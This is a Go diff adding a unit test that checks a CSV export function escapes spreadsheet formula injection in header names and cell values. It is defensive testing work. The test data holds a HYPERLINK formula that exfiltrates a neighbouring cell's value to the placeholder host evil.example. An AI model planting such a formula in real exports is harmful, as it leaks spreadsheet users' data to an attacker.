@@ -1,6 +1,11 @@
 package ui
 
-import "testing"
+import (
+	"strings"
+	"testing"
+
+	"github.com/n0rdy/pooml/query"
+)
 
 func TestCSVSafe(t *testing.T) {
 	tests := []struct {
@@ -25,5 +30,22 @@ func TestCSVSafe(t *testing.T) {
 		if got := csvSafe(tt.in); got != tt.want {
 			t.Errorf("csvSafe(%q) = %q, want %q", tt.in, got, tt.want)
 		}
+	}
+}
+
+// Column names come from aliases in the query text, so a crafted export link
+// controls the header row.
+func TestWriteCSVGuardsHeader(t *testing.T) {
+	var b strings.Builder
+	res := &query.Result{
+		Columns: []string{`=HYPERLINK("http://evil.example/?"&A2,"click")`, "message"},
+		Rows:    [][]any{{"svc", "=1+1"}},
+	}
+	if err := writeCSV(&b, res); err != nil {
+		t.Fatal(err)
+	}
+	want := `"'=HYPERLINK(""http://evil.example/?""&A2,""click"")",message` + "\n" + `svc,'=1+1` + "\n"
+	if b.String() != want {
+		t.Fatalf("csv =\n%s\nwant\n%s", b.String(), want)
 	}
 }
